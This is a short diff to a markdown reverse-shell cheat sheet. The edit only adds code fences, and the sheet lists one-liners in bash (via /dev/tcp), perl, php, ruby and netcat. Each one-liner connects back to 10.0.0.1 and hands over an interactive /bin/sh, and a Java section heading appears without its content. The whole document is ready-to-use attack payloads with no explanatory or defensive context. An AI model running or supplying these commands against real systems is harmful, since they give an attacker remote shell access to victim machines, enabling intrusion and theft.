@@ -1,9 +1,9 @@
 #Cheat Sheet's:
 
 # BASH:
-
+```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-
+```
 # PERL:
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -23,7 +23,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 # NETCAT:
-
+```
 nc -e /bin/sh 10.0.0.1 1234
 ```
 # JAVA:
